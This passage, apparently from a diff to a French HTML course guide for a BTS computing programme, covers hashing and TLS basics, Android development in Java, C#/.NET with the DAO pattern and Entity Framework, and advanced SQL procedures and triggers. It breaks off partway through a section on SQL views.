+<p>Une fonction de hachage est <strong>à sens unique</strong> : on ne peut pas retrouver l'entrée à partir de la sortie. Elle produit une empreinte (digest) de taille fixe.</p>
+<table>
+  <tr><th>Algorithme</th><th>Sortie</th><th>Sécurité</th></tr>
+  <tr><td><strong>MD5</strong></td><td>128 bits (32 hex)</td><td>Compromis — ne pas utiliser pour les mdp</td></tr>
+  <tr><td><strong>SHA-1</strong></td><td>160 bits (40 hex)</td><td>Compromis — obsolète</td></tr>
+  <tr><td><strong>SHA-256</strong></td><td>256 bits (64 hex)</td><td>Sûr pour l'intégrité (checksums)</td></tr>
+  <tr><td><strong>SHA-512</strong></td><td>512 bits (128 hex)</td><td>Sûr, plus coûteux</td></tr>
+  <tr><td><strong>bcrypt</strong></td><td>60 caractères</td><td>Spécifique mots de passe : lent + sel</td></tr>
+</table>
+<div class="warn">
+  <strong>MD5 ne protège pas les mots de passe !</strong> Les tables rainbow précalculent les hashes MD5 de millions de mots courants. Une recherche Google de <code>5f4dcc3b5aa765d61d8327deb882cf99</code> révèle immédiatement "password". bcrypt est résistant car son coût de calcul est configurable.
+</div>
+
+<h2 class="sec">Signature numérique</h2>
+<p>La signature numérique garantit <strong>l'authenticité</strong> (c'est bien l'expéditeur) et l'<strong>intégrité</strong> (le message n'a pas été modifié).</p>
+<div class="flow">
+  <div class="fs">Document</div><div class="fa">→ hash SHA-256 →</div>
+  <div class="fs">Empreinte</div><div class="fa">→ chiffre avec clé privée →</div>
+  <div class="fs red">Signature</div>
+</div>
+<p>Le destinataire déchiffre la signature avec la clé publique de l'expéditeur, recalcule le hash du document et compare. Si identiques → document authentique et non modifié.</p>
+
+<h2 class="sec">TLS / HTTPS</h2>
+<p>HTTPS = HTTP + TLS (Transport Layer Security). TLS chiffre toutes les communications entre le navigateur et le serveur. Sans TLS, un attaquant sur le réseau (café WiFi) peut lire les données en clair (<em>man-in-the-middle</em>).</p>
+
+<h3 class="sub">Handshake TLS (simplifié)</h3>
+<div class="flow">
+  <div class="fs">Client<br><small>Bonjour, voici mes algos</small></div><div class="fa">→</div>
+  <div class="fs">Serveur<br><small>Voici mon certificat</small></div><div class="fa">→</div>
+  <div class="fs">Client vérifie<br><small>CA reconnue ?</small></div><div class="fa">→</div>
+  <div class="fs green">Clé de session<br><small>AES-256 négociée</small></div>
+</div>
+
+<table>
+  <tr><th>Concept</th><th>Rôle</th></tr>
+  <tr><td><strong>Certificat SSL/TLS</strong></td><td>Fichier signé par une autorité de certification (CA) qui prouve l'identité du serveur</td></tr>
+  <tr><td><strong>CA (Autorité de certification)</strong></td><td>Organisme de confiance (Let's Encrypt, DigiCert) qui signe les certificats</td></tr>
+  <tr><td><strong>Clé de session</strong></td><td>Clé AES éphémère négociée via RSA/ECC — renouvellée à chaque connexion</td></tr>
+  <tr><td><strong>Perfect Forward Secrecy</strong></td><td>Chaque session a sa propre clé → une clé compromise ne décrypte pas les sessions passées</td></tr>
+</table>
+
+<div class="ok">
+  <strong>Dans Epoka (localhost WAMP) :</strong> Pas de TLS en développement. En production, il faudrait : un certificat Let's Encrypt (gratuit), configurer Apache avec <code>mod_ssl</code>, forcer la redirection HTTP → HTTPS avec <code>mod_rewrite</code>.
+</div>
+
+<!-- ████████████████████████████████████████████████████
+     PARTIE 18 — ANDROID
+     ████████████████████████████████████████████████████ -->
+<h1 class="part">PARTIE 18 — Développement Android (Java)</h1>
+<span class="bts-tag bts-2">2ème année</span>
+
+<h2 class="sec">Architecture Android</h2>
+<p>Android est un système d'exploitation mobile basé sur Linux. Les applications Java/Kotlin s'exécutent sur la <strong>machine virtuelle ART</strong> (Android Runtime).</p>
+<table>
+  <tr><th>Couche</th><th>Description</th></tr>
+  <tr><td><strong>Activity</strong></td><td>Écran de l'application. Chaque écran = une Activity.</td></tr>
+  <tr><td><strong>Fragment</strong></td><td>Portion réutilisable d'interface dans une Activity.</td></tr>
+  <tr><td><strong>Intent</strong></td><td>Message pour démarrer une Activity ou un Service.</td></tr>
+  <tr><td><strong>Layout XML</strong></td><td>Fichier XML qui décrit l'interface graphique (res/layout/).</td></tr>
+  <tr><td><strong>AndroidManifest.xml</strong></td><td>Fichier de configuration de l'app (permissions, activités déclarées).</td></tr>
+  <tr><td><strong>Gradle</strong></td><td>Outil de build qui compile et package l'application (.apk).</td></tr>
+</table>
+
+<h2 class="sec">Cycle de vie d'une Activity</h2>
+<pre>
+<span class="k">public class</span> <span class="n">MainActivity</span> <span class="k">extends</span> <span class="n">AppCompatActivity</span> {
+
+    @<span class="n">Override</span>
+    <span class="k">protected void</span> <span class="f">onCreate</span>(<span class="n">Bundle</span> savedInstanceState) {
+        <span class="k">super</span>.<span class="f">onCreate</span>(savedInstanceState);
+        <span class="f">setContentView</span>(R.layout.activity_main); <span class="c">// Lier le layout XML</span>
+    }
+
+    @<span class="n">Override</span>
+    <span class="k">protected void</span> <span class="f">onStart</span>()  { <span class="k">super</span>.<span class="f">onStart</span>(); }  <span class="c">// Activity visible</span>
+
+    @<span class="n">Override</span>
+    <span class="k">protected void</span> <span class="f">onResume</span>() { <span class="k">super</span>.<span class="f">onResume</span>(); } <span class="c">// Au premier plan, interactive</span>
+
+    @<span class="n">Override</span>
+    <span class="k">protected void</span> <span class="f">onPause</span>()  { <span class="k">super</span>.<span class="f">onPause</span>(); }  <span class="c">// Partiellement cachée</span>
+
+    @<span class="n">Override</span>
+    <span class="k">protected void</span> <span class="f">onStop</span>()   { <span class="k">super</span>.<span class="f">onStop</span>(); }   <span class="c">// Totalement cachée</span>
+
+    @<span class="n">Override</span>
+    <span class="k">protected void</span> <span class="f">onDestroy</span>(){ <span class="k">super</span>.<span class="f">onDestroy</span>(); }<span class="c">// Activity détruite</span>
+}
+</pre>
+
+<div class="info">
+  <strong>Ordre onCreate → onStart → onResume</strong> au lancement. Appui sur le bouton Retour : <strong>onPause → onStop → onDestroy</strong>. Rotation d'écran : onDestroy puis onCreate (re-création). Sauvegarder l'état avec <code>onSaveInstanceState(Bundle)</code>.
+</div>
+
+<h2 class="sec">Intents — Navigation entre activités</h2>
+<pre>
+<span class="c">// Intent explicite : démarrer une Activity précise</span>
+<span class="n">Intent</span> intent = <span class="k">new</span> <span class="n">Intent</span>(<span class="k">this</span>, DetailActivity.<span class="k">class</span>);
+intent.<span class="f">putExtra</span>(<span class="s">"MISSION_ID"</span>, 5);   <span class="c">// Passer des données</span>
+<span class="f">startActivity</span>(intent);
+
+<span class="c">// Récupérer les données dans DetailActivity</span>
+<span class="k">int</span> id = <span class="f">getIntent</span>().<span class="f">getIntExtra</span>(<span class="s">"MISSION_ID"</span>, -1);
+
+<span class="c">// Intent implicite : ouvrir une URL dans le navigateur</span>
+<span class="n">Intent</span> browser = <span class="k">new</span> <span class="n">Intent</span>(<span class="n">Intent</span>.ACTION_VIEW, <span class="n">Uri</span>.<span class="f">parse</span>(<span class="s">"https://epoka.fr"</span>));
+<span class="f">startActivity</span>(browser);
+
+<span class="c">// Intent implicite : appel téléphonique</span>
+<span class="n">Intent</span> call = <span class="k">new</span> <span class="n">Intent</span>(<span class="n">Intent</span>.ACTION_DIAL, <span class="n">Uri</span>.<span class="f">parse</span>(<span class="s">"tel:0123456789"</span>));
+<span class="f">startActivity</span>(call);
+</pre>
+
+<h2 class="sec">Éléments d'interface (Views)</h2>
+<pre>
+<span class="c">&lt;!-- res/layout/activity_main.xml --&gt;</span>
+&lt;LinearLayout android:orientation="vertical"&gt;
+
+    &lt;TextView
+        android:id="@+id/tv_titre"
+        android:text="Mes missions"
+        android:textSize="20sp" /&gt;
+
+    &lt;EditText
+        android:id="@+id/et_recherche"
+        android:hint="Rechercher une mission..."
+        android:inputType="text" /&gt;
+
+    &lt;Button
+        android:id="@+id/btn_valider"
+        android:text="Valider" /&gt;
+
+    &lt;RecyclerView
+        android:id="@+id/rv_missions"
+        android:layout_height="match_parent" /&gt;
+
+&lt;/LinearLayout&gt;
+</pre>
+<pre>
+<span class="c">// Récupérer les vues dans le code Java</span>
+<span class="n">TextView</span>  tvTitre  = <span class="f">findViewById</span>(R.id.tv_titre);
+<span class="n">EditText</span>  etRech   = <span class="f">findViewById</span>(R.id.et_recherche);
+<span class="n">Button</span>    btnVal   = <span class="f">findViewById</span>(R.id.btn_valider);
+
+tvTitre.<span class="f">setText</span>(<span class="s">"Bonjour !"</span>);
+btnVal.<span class="f">setOnClickListener</span>(v -> <span class="n">Toast</span>.<span class="f">makeText</span>(<span class="k">this</span>,<span class="s">"Validé"</span>,<span class="n">Toast</span>.LENGTH_SHORT).<span class="f">show</span>());
+</pre>
+
+<h2 class="sec">RecyclerView — Listes dynamiques</h2>
+<pre>
+<span class="c">// 1. L'Adapter : lie les données à la vue</span>
+<span class="k">public class</span> <span class="n">MissionAdapter</span> <span class="k">extends</span> <span class="n">RecyclerView.Adapter</span>&lt;<span class="n">MissionAdapter.VH</span>&gt; {
+    <span class="k">private</span> <span class="n">List</span>&lt;<span class="n">Mission</span>&gt; missions;
+
+    <span class="k">static class</span> <span class="n">VH</span> <span class="k">extends</span> <span class="n">RecyclerView.ViewHolder</span> {
+        <span class="n">TextView</span> tvIntitule;
+        VH(<span class="n">View</span> v) { <span class="k">super</span>(v); tvIntitule = v.<span class="f">findViewById</span>(R.id.tv_intitule); }
+    }
+
+    @<span class="n">Override</span>
+    <span class="k">public void</span> <span class="f">onBindViewHolder</span>(<span class="n">VH</span> holder, <span class="k">int</span> pos) {
+        holder.tvIntitule.<span class="f">setText</span>(missions.<span class="f">get</span>(pos).<span class="f">getIntitule</span>());
+    }
+}
+
+<span class="c">// 2. Dans l'Activity</span>
+<span class="n">RecyclerView</span> rv = <span class="f">findViewById</span>(R.id.rv_missions);
+rv.<span class="f">setLayoutManager</span>(<span class="k">new</span> <span class="n">LinearLayoutManager</span>(<span class="k">this</span>));
+rv.<span class="f">setAdapter</span>(<span class="k">new</span> <span class="n">MissionAdapter</span>(listeMissions));
+</pre>
+
+<h2 class="sec">Base de données locale — SQLite</h2>
+<pre>
+<span class="k">public class</span> <span class="n">DBHelper</span> <span class="k">extends</span> <span class="n">SQLiteOpenHelper</span> {
+    <span class="k">private static final</span> <span class="n">String</span> DB_NAME    = <span class="s">"epoka.db"</span>;
+    <span class="k">private static final</span> <span class="k">int</span>    DB_VERSION = 1;
+
+    <span class="k">public</span> <span class="n">DBHelper</span>(<span class="n">Context</span> ctx) {
+        <span class="k">super</span>(ctx, DB_NAME, <span class="k">null</span>, DB_VERSION);
+    }
+
+    @<span class="n">Override</span>
+    <span class="k">public void</span> <span class="f">onCreate</span>(<span class="n">SQLiteDatabase</span> db) {
+        db.<span class="f">execSQL</span>(<span class="s">"CREATE TABLE mission (id INTEGER PRIMARY KEY, intitule TEXT NOT NULL)"</span>);
+    }
+
+    <span class="c">// Insérer</span>
+    <span class="k">public void</span> <span class="f">insert</span>(<span class="n">String</span> intitule) {
+        <span class="n">ContentValues</span> cv = <span class="k">new</span> <span class="n">ContentValues</span>();
+        cv.<span class="f">put</span>(<span class="s">"intitule"</span>, intitule);
+        <span class="f">getWritableDatabase</span>().<span class="f">insert</span>(<span class="s">"mission"</span>, <span class="k">null</span>, cv);
+    }
+
+    <span class="c">// Lire</span>
+    <span class="k">public</span> <span class="n">Cursor</span> <span class="f">getAll</span>() {
+        <span class="k">return</span> <span class="f">getReadableDatabase</span>().<span class="f">rawQuery</span>(<span class="s">"SELECT * FROM mission"</span>, <span class="k">null</span>);
+    }
+}
+</pre>
+
+<h2 class="sec">Communication réseau — Volley</h2>
+<pre>
+<span class="c">// Dépendance dans build.gradle</span>
+<span class="c">// implementation 'com.android.volley:volley:1.2.1'</span>
+
+<span class="n">RequestQueue</span> queue = <span class="n">Volley</span>.<span class="f">newRequestQueue</span>(<span class="k">this</span>);
+<span class="n">String</span> url = <span class="s">"https://api.epoka.fr/missions"</span>;
+
+<span class="n">JsonArrayRequest</span> req = <span class="k">new</span> <span class="n">JsonArrayRequest</span>(url,
+    response -> {
+        <span class="c">// Succès : response est un JSONArray</span>
+        <span class="k">for</span> (<span class="k">int</span> i = 0; i &lt; response.<span class="f">length</span>(); i++) {
+            <span class="n">JSONObject</span> m = response.<span class="f">getJSONObject</span>(i);
+            missions.<span class="f">add</span>(m.<span class="f">getString</span>(<span class="s">"intitule"</span>));
+        }
+        adapter.<span class="f">notifyDataSetChanged</span>();
+    },
+    error -> <span class="n">Log</span>.<span class="f">e</span>(<span class="s">"VOLLEY"</span>, <span class="s">"Erreur réseau"</span>, error)
+);
+queue.<span class="f">add</span>(req);
+</pre>
+
+<h2 class="sec">Géolocalisation</h2>
+<pre>
+<span class="c">// Déclarer la permission dans AndroidManifest.xml</span>
+<span class="c">&lt;uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" /&gt;</span>
+
+<span class="c">// Demander la permission à l'exécution (API 23+)</span>
+<span class="k">if</span> (<span class="n">ContextCompat</span>.<span class="f">checkSelfPermission</span>(<span class="k">this</span>, <span class="n">Manifest.permission</span>.ACCESS_FINE_LOCATION)
+        != <span class="n">PackageManager</span>.PERMISSION_GRANTED) {
+    <span class="n">ActivityCompat</span>.<span class="f">requestPermissions</span>(<span class="k">this</span>,
+        <span class="k">new</span> <span class="n">String</span>[]{ <span class="n">Manifest.permission</span>.ACCESS_FINE_LOCATION }, 1);
+}
+
+<span class="c">// Obtenir la position avec FusedLocationProviderClient (recommandé)</span>
+<span class="n">FusedLocationProviderClient</span> flp = <span class="n">LocationServices</span>.<span class="f">getFusedLocationProviderClient</span>(<span class="k">this</span>);
+flp.<span class="f">getLastLocation</span>().<span class="f">addOnSuccessListener</span>(location -> {
+    <span class="k">if</span> (location != <span class="k">null</span>) {
+        <span class="k">double</span> lat = location.<span class="f">getLatitude</span>();
+        <span class="k">double</span> lng = location.<span class="f">getLongitude</span>();
+    }
+});
+</pre>
+
+<h2 class="sec">Tests unitaires — JUnit</h2>
+<pre>
+<span class="c">// Dans app/src/test/java/...</span>
+<span class="k">public class</span> <span class="n">CalculFraisTest</span> {
+
+    @Test
+    <span class="k">public void</span> <span class="f">testFraisKm_nominal</span>() {
+        <span class="k">double</span> resultat = CalculFrais.<span class="f">calculerKm</span>(300, 0.50);
+        <span class="n">assertEquals</span>(150.0, resultat, 0.001);
+    }
+
+    @Test
+    <span class="k">public void</span> <span class="f">testFraisKm_zero</span>() {
+        <span class="k">double</span> resultat = CalculFrais.<span class="f">calculerKm</span>(0, 0.50);
+        <span class="n">assertEquals</span>(0.0, resultat, 0.001);
+    }
+
+    @Test(<span class="n">expected</span> = <span class="n">IllegalArgumentException</span>.<span class="k">class</span>)
+    <span class="k">public void</span> <span class="f">testFraisKm_negatif</span>() {
+        CalculFrais.<span class="f">calculerKm</span>(-10, 0.50);   <span class="c">// doit lever une exception</span>
+    }
+}
+</pre>
+
+<!-- ████████████████████████████████████████████████████
+     PARTIE 19 — C# / .NET / DESIGN PATTERNS
+     ████████████████████████████████████████████████████ -->
+<h1 class="part">PARTIE 19 — C# / .NET et Design Patterns avancés</h1>
+<span class="bts-tag bts-2">2ème année</span>
+
+<h2 class="sec">Langage C# — Bases</h2>
+<p>C# (C-Sharp) est un langage orienté objet développé par Microsoft, qui s'exécute sur la plateforme <strong>.NET</strong>. Syntaxe proche de Java.</p>
+<pre>
+<span class="c">// Types de base</span>
+<span class="k">int</span>    id       = 5;
+<span class="k">string</span> nom      = <span class="s">"Dupont"</span>;
+<span class="k">bool</span>   actif    = <span class="k">true</span>;
+<span class="k">double</span> montant  = 150.75;
+<span class="k">decimal</span> prix    = 0.50m;   <span class="c">// decimal recommandé pour l'argent</span>
+
+<span class="c">// Classe et propriétés auto-implémentées</span>
+<span class="k">public class</span> <span class="n">Mission</span> {
+    <span class="k">public int</span>    Id       { <span class="k">get</span>; <span class="k">set</span>; }
+    <span class="k">public string</span> Intitule { <span class="k">get</span>; <span class="k">set</span>; }
+    <span class="k">public</span> <span class="n">DateTime</span> DateDebut { <span class="k">get</span>; <span class="k">set</span>; }
+}
+
+<span class="c">// Instanciation</span>
+<span class="k">var</span> m = <span class="k">new</span> <span class="n">Mission</span> { Id = 1, Intitule = <span class="s">"Formation C#"</span> };
+<span class="n">Console</span>.<span class="f">WriteLine</span>(m.Intitule);
+</pre>
+
+<h2 class="sec">Gestion des exceptions — try / catch / finally</h2>
+<pre>
+<span class="k">try</span> {
+    <span class="c">// Code susceptible de lever une exception</span>
+    <span class="k">int</span> result = <span class="k">int</span>.<span class="f">Parse</span>(userInput);   <span class="c">// FormatException si non numérique</span>
+    <span class="n">SqlCommand</span> cmd = <span class="k">new</span> <span class="n">SqlCommand</span>(sql, conn);
+    conn.<span class="f">Open</span>();                          <span class="c">// SqlException si BDD inaccessible</span>
+    cmd.<span class="f">ExecuteNonQuery</span>();
+}
+<span class="k">catch</span> (<span class="n">FormatException</span> ex) {
+    <span class="c">// Gérer l'erreur de format (ex.Message contient le détail)</span>
+    <span class="n">MessageBox</span>.<span class="f">Show</span>(<span class="s">"Saisie invalide : "</span> + ex.Message);
+}
+<span class="k">catch</span> (<span class="n">SqlException</span> ex) {
+    <span class="n">Console</span>.<span class="f">WriteLine</span>(<span class="s">"Erreur BDD : "</span> + ex.Number + <span class="s">" - "</span> + ex.Message);
+}
+<span class="k">catch</span> (<span class="n">Exception</span> ex) {
+    <span class="c">// Attrape toutes les autres exceptions (catch générique)</span>
+    <span class="n">Console</span>.<span class="f">WriteLine</span>(<span class="s">"Erreur inattendue : "</span> + ex.Message);
+}
+<span class="k">finally</span> {
+    <span class="c">// Toujours exécuté, même si exception — idéal pour fermer la connexion</span>
+    conn?.Close();
+}
+</pre>
+
+<h2 class="sec">Connexion SQL Server — ADO.NET sans DAO</h2>
+<pre>
+<span class="k">string</span> cs = <span class="s">@"Server=localhost\SQLEXPRESS;Database=Epoka;Trusted_Connection=True;"</span>;
+<span class="k">using var</span> conn = <span class="k">new</span> <span class="n">SqlConnection</span>(cs);
+
+<span class="k">string</span> sql = <span class="s">"SELECT * FROM mission WHERE id_salarie = @IdSalarie"</span>;
+<span class="k">using var</span> cmd = <span class="k">new</span> <span class="n">SqlCommand</span>(sql, conn);
+cmd.Parameters.<span class="f">AddWithValue</span>(<span class="s">"@IdSalarie"</span>, 5);   <span class="c">// Paramètre nommé (anti-injection)</span>
+
+conn.<span class="f">Open</span>();
+<span class="k">using var</span> reader = cmd.<span class="f">ExecuteReader</span>();
+<span class="k">while</span> (reader.<span class="f">Read</span>()) {
+    <span class="n">Console</span>.<span class="f">WriteLine</span>(reader[<span class="s">"intitule"</span>].ToString());
+}
+</pre>
+
+<h2 class="sec">Design Pattern DAO (Data Access Object)</h2>
+<p>Le DAO est un patron de conception qui <strong>sépare le code d'accès aux données</strong> de la logique métier. On définit une interface, puis une implémentation concrète.</p>
+
+<pre>
+<span class="c">// 1. L'interface — contrat</span>
+<span class="k">public interface</span> <span class="n">IMissionDAO</span> {
+    <span class="n">List</span>&lt;<span class="n">Mission</span>&gt; <span class="f">GetAll</span>();
+    <span class="n">Mission</span>       <span class="f">GetById</span>(<span class="k">int</span> id);
+    <span class="k">void</span>           <span class="f">Insert</span>(<span class="n">Mission</span> m);
+    <span class="k">void</span>           <span class="f">Update</span>(<span class="n">Mission</span> m);
+    <span class="k">void</span>           <span class="f">Delete</span>(<span class="k">int</span> id);
+}
+
+<span class="c">// 2. L'implémentation SQL Server</span>
+<span class="k">public class</span> <span class="n">MissionDAO</span> : <span class="n">IMissionDAO</span> {
+    <span class="k">private readonly string</span> _connectionString;
+
+    <span class="k">public</span> <span class="n">MissionDAO</span>(<span class="k">string</span> cs) { _connectionString = cs; }
+
+    <span class="k">public</span> <span class="n">List</span>&lt;<span class="n">Mission</span>&gt; <span class="f">GetAll</span>() {
+        <span class="k">var</span> list = <span class="k">new</span> <span class="n">List</span>&lt;<span class="n">Mission</span>&gt;();
+        <span class="k">using var</span> conn = <span class="k">new</span> <span class="n">SqlConnection</span>(_connectionString);
+        <span class="k">using var</span> cmd  = <span class="k">new</span> <span class="n">SqlCommand</span>(<span class="s">"SELECT * FROM mission"</span>, conn);
+        conn.<span class="f">Open</span>();
+        <span class="k">using var</span> r = cmd.<span class="f">ExecuteReader</span>();
+        <span class="k">while</span> (r.<span class="f">Read</span>())
+            list.<span class="f">Add</span>(<span class="k">new</span> <span class="n">Mission</span> { Id = (<span class="k">int</span>)r[<span class="s">"id"</span>], Intitule = r[<span class="s">"intitule"</span>].ToString() });
+        <span class="k">return</span> list;
+    }
+    <span class="c">// ... autres méthodes</span>
+}
+
+<span class="c">// 3. Utilisation dans la couche métier</span>
+<span class="n">IMissionDAO</span> dao = <span class="k">new</span> <span class="n">MissionDAO</span>(connectionString);
+<span class="k">var</span> missions = dao.<span class="f">GetAll</span>();
+</pre>
+
+<div class="info">
+  <strong>Avantage clé :</strong> On peut remplacer <code>MissionDAO</code> (SQL Server) par <code>MissionDAOMySql</code> ou <code>MissionDAOFake</code> (pour les tests) sans modifier le code métier — il dépend de l'interface, pas de l'implémentation. C'est le principe <strong>Dependency Inversion</strong> (lettre D de SOLID).
+</div>
+
+<h2 class="sec">ORM — Entity Framework</h2>
+<p>Un ORM (Object-Relational Mapper) <strong>mappe automatiquement</strong> les tables SQL vers des classes C#. Plus besoin d'écrire du SQL manuellement pour les opérations CRUD courantes.</p>
+
+<pre>
+<span class="c">// 1. Le contexte de données (représente la BDD)</span>
+<span class="k">public class</span> <span class="n">EpokaContext</span> : <span class="n">DbContext</span> {
+    <span class="k">public</span> <span class="n">DbSet</span>&lt;<span class="n">Mission</span>&gt;  Missions  { <span class="k">get</span>; <span class="k">set</span>; }
+    <span class="k">public</span> <span class="n">DbSet</span>&lt;<span class="n">Salarie</span>&gt;  Salaries  { <span class="k">get</span>; <span class="k">set</span>; }
+
+    <span class="k">protected override void</span> <span class="f">OnConfiguring</span>(<span class="n">DbContextOptionsBuilder</span> o)
+        => o.<span class="f">UseSqlServer</span>(<span class="s">@"Server=.\SQLEXPRESS;Database=Epoka;..."</span>);
+}
+
+<span class="c">// 2. Opérations CRUD avec LINQ (pas de SQL écrit)</span>
+<span class="k">using var</span> ctx = <span class="k">new</span> <span class="n">EpokaContext</span>();
+
+<span class="c">// SELECT *</span>
+<span class="k">var</span> toutes = ctx.Missions.<span class="f">ToList</span>();
+
+<span class="c">// SELECT WHERE</span>
+<span class="k">var</span> brouillons = ctx.Missions
+    .<span class="f">Where</span>(m => m.Statut == <span class="s">"brouillon"</span>)
+    .<span class="f">OrderBy</span>(m => m.DateDebut)
+    .<span class="f">ToList</span>();
+
+<span class="c">// INSERT</span>
+ctx.Missions.<span class="f">Add</span>(<span class="k">new</span> <span class="n">Mission</span> { Intitule = <span class="s">"Audit"</span>, Statut = <span class="s">"brouillon"</span> });
+ctx.<span class="f">SaveChanges</span>();
+
+<span class="c">// UPDATE</span>
+<span class="k">var</span> m = ctx.Missions.<span class="f">Find</span>(5);
+m.Statut = <span class="s">"validee"</span>;
+ctx.<span class="f">SaveChanges</span>();
+
+<span class="c">// DELETE</span>
+ctx.Missions.<span class="f">Remove</span>(m);
+ctx.<span class="f">SaveChanges</span>();
+</pre>
+
+<table>
+  <tr><th>Approche</th><th>Avantages</th><th>Inconvénients</th></tr>
+  <tr><td><strong>ADO.NET pur</strong></td><td>Contrôle total du SQL, performances optimales</td><td>Code verbeux, risque d'injection si mal utilisé</td></tr>
+  <tr><td><strong>DAO + ADO.NET</strong></td><td>Code structuré, testable, séparation des couches</td><td>Encore du SQL à écrire</td></tr>
+  <tr><td><strong>Entity Framework ORM</strong></td><td>Productivité élevée, pas de SQL, LINQ puissant</td><td>Moins de contrôle, requêtes parfois sous-optimales</td></tr>
+</table>
+
+<h2 class="sec">LINQ — Language Integrated Query</h2>
+<pre>
+<span class="k">var</span> missions = <span class="k">new</span> <span class="n">List</span>&lt;<span class="n">Mission</span>&gt; { ... };
+
+<span class="c">// Syntaxe méthode (lambda)</span>
+<span class="k">var</span> validees = missions
+    .<span class="f">Where</span>(m  => m.Statut == <span class="s">"validee"</span>)
+    .<span class="f">Select</span>(m => m.Intitule)
+    .<span class="f">OrderBy</span>(s => s)
+    .<span class="f">ToList</span>();
+
+<span class="c">// Syntaxe requête (proche du SQL)</span>
+<span class="k">var</span> res = <span class="k">from</span> m <span class="k">in</span> missions
+          <span class="k">where</span> m.Statut == <span class="s">"validee"</span>
+          <span class="k">orderby</span> m.DateDebut
+          <span class="k">select</span> m.Intitule;
+
+<span class="c">// Aggrégats</span>
+<span class="k">int</span>    nb      = missions.<span class="f">Count</span>();
+<span class="k">double</span> total   = missions.<span class="f">Sum</span>(m => m.MontantTotal);
+<span class="k">double</span> moyenne = missions.<span class="f">Average</span>(m => m.MontantTotal);
+</pre>
+
+<!-- ████████████████████████████████████████████████████
+     PARTIE 20 — SQL AVANCÉ
+     ████████████████████████████████████████████████████ -->
+<h1 class="part">PARTIE 20 — SQL Avancé</h1>
+<span class="bts-tag bts-2">2ème année</span>
+
+<h2 class="sec">Procédures stockées</h2>
+<p>Une procédure stockée est un <strong>programme SQL enregistré côté serveur</strong>, appelable avec un seul nom. Avantages : performances (compilée), sécurité (on donne le droit d'exécuter la procédure sans donner l'accès aux tables), réutilisabilité.</p>
+
+<pre>
+<span class="c">-- Créer une procédure stockée (MySQL)</span>
+<span class="kw">DELIMITER</span> //
+<span class="kw">CREATE PROCEDURE</span> <span class="f">valider_mission</span>(IN p_id_mission <span class="k">INT</span>, IN p_id_valideur <span class="k">INT</span>)
+<span class="kw">BEGIN</span>
+    <span class="c">-- Vérifier que la mission est en brouillon</span>
+    <span class="kw">IF</span> (<span class="kw">SELECT</span> statut <span class="kw">FROM</span> mission <span class="kw">WHERE</span> id = p_id_mission) = <span class="s">'brouillon'</span> <span class="kw">THEN</span>
+        <span class="kw">UPDATE</span> mission
+        <span class="kw">SET</span>    statut = <span class="s">'validee'</span>
+        <span class="kw">WHERE</span>  id = p_id_mission;
+        <span class="kw">SELECT</span> <span class="s">'OK'</span> <span class="kw">AS</span> resultat;
+    <span class="kw">ELSE</span>
+        <span class="kw">SELECT</span> <span class="s">'ERREUR: statut invalide'</span> <span class="kw">AS</span> resultat;
+    <span class="kw">END IF</span>;
+<span class="kw">END</span>//
+<span class="kw">DELIMITER</span> ;
+
+<span class="c">-- Appeler la procédure</span>
+<span class="kw">CALL</span> <span class="f">valider_mission</span>(7, 3);
+
+<span class="c">-- Supprimer une procédure</span>
+<span class="kw">DROP PROCEDURE IF EXISTS</span> <span class="f">valider_mission</span>;
+</pre>
+
+<h3 class="sub">Paramètres IN / OUT / INOUT</h3>
+<pre>
+<span class="kw">CREATE PROCEDURE</span> <span class="f">compter_missions</span>(
+    IN  p_statut    <span class="k">VARCHAR(20)</span>,
+    OUT p_nb        <span class="k">INT</span>
+)
+<span class="kw">BEGIN</span>
+    <span class="kw">SELECT COUNT</span>(*) <span class="kw">INTO</span> p_nb
+    <span class="kw">FROM</span> mission <span class="kw">WHERE</span> statut = p_statut;
+<span class="kw">END</span>;
+
+<span class="c">-- Utilisation</span>
+<span class="kw">CALL</span> <span class="f">compter_missions</span>(<span class="s">'validee'</span>, @nb);
+<span class="kw">SELECT</span> @nb;  <span class="c">-- affiche le résultat</span>
+</pre>
+
+<h2 class="sec">Triggers (déclencheurs)</h2>
+<p>Un trigger est un programme SQL qui s'exécute <strong>automatiquement</strong> avant ou après une opération INSERT/UPDATE/DELETE sur une table. Il ne peut pas être appelé manuellement.</p>
+
+<pre>
+<span class="c">-- Trigger BEFORE INSERT : forcer le statut à 'brouillon'</span>
+<span class="kw">CREATE TRIGGER</span> <span class="f">before_mission_insert</span>
+<span class="kw">BEFORE INSERT ON</span> mission
+<span class="kw">FOR EACH ROW</span>
+<span class="kw">BEGIN</span>
+    <span class="kw">SET</span> NEW.statut = <span class="s">'brouillon'</span>;  <span class="c">-- NEW = la ligne qui va être insérée</span>
+<span class="kw">END</span>;
+
+<span class="c">-- Trigger AFTER UPDATE : journaliser les changements de statut</span>
+<span class="kw">CREATE TRIGGER</span> <span class="f">after_mission_statut</span>
+<span class="kw">AFTER UPDATE ON</span> mission
+<span class="kw">FOR EACH ROW</span>
+<span class="kw">BEGIN</span>
+    <span class="kw">IF</span> OLD.statut != NEW.statut <span class="kw">THEN</span>
+        <span class="kw">INSERT INTO</span> log_mission (id_mission, ancien_statut, nouveau_statut, modifie_le)
+        <span class="kw">VALUES</span> (NEW.id, OLD.statut, NEW.statut, <span class="f">NOW</span>());
+        <span class="c">-- OLD = valeurs avant UPDATE, NEW = valeurs après</span>
+    <span class="kw">END IF</span>;
+<span class="kw">END</span>;
+</pre>
+
+<table>
+  <tr><th>Type</th><th>Moment</th><th>Variables disponibles</th></tr>
+  <tr><td><code>BEFORE INSERT</code></td><td>Avant l'insertion</td><td><code>NEW.*</code></td></tr>
+  <tr><td><code>AFTER INSERT</code></td><td>Après l'insertion</td><td><code>NEW.*</code></td></tr>
+  <tr><td><code>BEFORE UPDATE</code></td><td>Avant la mise à jour</td><td><code>OLD.*</code> et <code>NEW.*</code></td></tr>
+  <tr><td><code>AFTER UPDATE</code></td><td>Après la mise à jour</td><td><code>OLD.*</code> et <code>NEW.*</code></td></tr>
+  <tr><td><code>BEFORE DELETE</code></td><td>Avant la suppression</td><td><code>OLD.*</code></td></tr>
+  <tr><td><code>AFTER DELETE</code></td><td>Après la suppression</td><td><code>OLD.*</code></td></tr>
+</table>
+
+<h2 class="sec">Vues (VIEW)</h2>
+<p>Une vue est une <strong>requête SELECT mémorisée</strong> et utilisable comme une table virtuelle. Elle ne stocke pas les données, elle les recalcule à chaque appel.</p>
+
+<pre>
+<span class="c">-- Créer une vue : missions avec nom du salarié et des villes</span>
